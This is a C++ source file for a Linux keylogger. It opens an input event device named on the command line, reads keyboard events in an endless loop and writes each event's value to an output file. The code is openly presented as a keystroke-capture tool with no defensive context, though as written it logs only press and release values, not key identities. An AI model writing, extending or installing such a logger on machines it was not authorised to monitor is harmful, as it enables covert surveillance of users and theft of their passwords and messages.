#include <iostream>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <errno.h>

using namespace std;

class KeyLogger 
{
private:
  int fd;
  FILE *pFile;
  struct input_event ev;

public:
  KeyLogger(int argc, char **argv)
  {
    if (argc != 3)
      {
	cerr <<  "usage: " << argv[0] << " event-device output-file - probably /dev/input/evdev0" << endl;
	exit(1);	
      }

    if ((fd = open(argv[1], O_RDONLY | O_NOCTTY )) < 0)
      {
	cerr <<  "evdev open: " << strerror(errno) << endl;
	exit(1);
      }

    if (!(pFile = fopen(argv[2], "w")))
      {
	cerr <<  "od open: " << strerror(errno) << endl;
	exit(1);
      }
  }

  void log()
  {
    while(1)
      {
	if (read(fd, &ev, sizeof(ev)) < 0)
	  {
	    cerr <<  "read: " << strerror(errno) << endl;
	    exit(1);
	  }

	if (fprintf(pFile, "%d\n", ev.value) < 0)
	  {
	    cerr <<  "pFile write: " << strerror(errno) << endl;
	    exit(1);
	  }
	fflush(pFile);
      }

    close(fd);
    fclose(pFile);
    
    exit(0);
  }
};


int main(int argc, char **argv)
{
  KeyLogger *keylogger;
  keylogger = new KeyLogger(argc, argv);
  keylogger->log();
  delete keylogger;
}
